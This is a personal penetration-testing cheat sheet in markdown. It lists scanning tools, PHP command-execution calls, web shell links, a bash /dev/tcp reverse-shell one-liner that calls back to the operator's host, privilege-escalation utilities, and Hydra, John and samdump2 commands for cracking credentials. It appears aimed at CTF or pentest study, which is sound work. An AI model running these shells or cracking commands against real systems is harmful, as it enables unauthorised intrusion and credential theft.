# My Security Resources
## Scan
### Services
- nmap
    - Parameters
        - `-A` : Enable OS detection, version detection, script scanning, and traceroute
        - `-p-` : Scan all ports
- enum4linux
    - Parameters
        - `-a` : Do all simple enumeration
## Web
### Scan Directory
- [Dirsearch](https://github.com/maurosoria/dirsearch)
- [Githack-python3](https://github.com/tigert1998/GitHack-py3)
### PHP
- Bypass `system`
	- `echo passthru("whoami")`
	- `echo shell_exec("whoami")` 
	- `echo exec("whoami")`
### Shell
#### Web Shell
- [b374k](https://github.com/b374k/b374k)
- [windows-php-reverse-shell](https://github.com/Dhayalanb/windows-php-reverse-shell)

#### Reverse Shell
- https://reverse-shell.sh/
- [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- Bash tcp
    - `bash -c 'bash -i >& /dev/tcp/my_ip/7877 0>&1'`
- Make it moreinteractively
    - `python -c 'import pty; pty.spawn("/bin/bash")'`
## Privilege
### Software
- [GTFOBins](https://gtfobins.github.io/)
    - Linux privileges escalation 
- [PEASS-ng](https://github.com/carlospolop/PEASS-ng) , [LinEnum](https://github.com/rebootuser/LinEnum)
    - Scan the system to find which can be use for privileges escalation
- [Pspy](https://github.com/DominicBreuker/pspy)
    - Monitor the process
### Command
- `sudo -l`
## Password Crack
### Software
- Hydra
    - Crack online services password
        - SMB、SSH......
    - Usage
        - `hydra -l {username} -P {path_to_wordlist} ssh://{ip_address}`
- John the ripper
    - Crack hash like /etc/shadow
    - Support tools
        - [ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)
        - gpg2john
        - samdump2
        	- NTLM 2 John
        	- `samdump2 system sam > j.txt`
    - Usage
        - `john {file} --wordlist={wordlist}`
- Hashcat
    - Crack hash 
### Dictionary
- rockyou.txt
- https://github.com/danielmiessler/SecLists
	- [xato-net-10-million-passwords-dup.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-dup.txt)
### Online
- https://crackstation.net/

## Software
- RDP
	- `xfreerdp +drives /u:{username} /v:{ip}:{port}`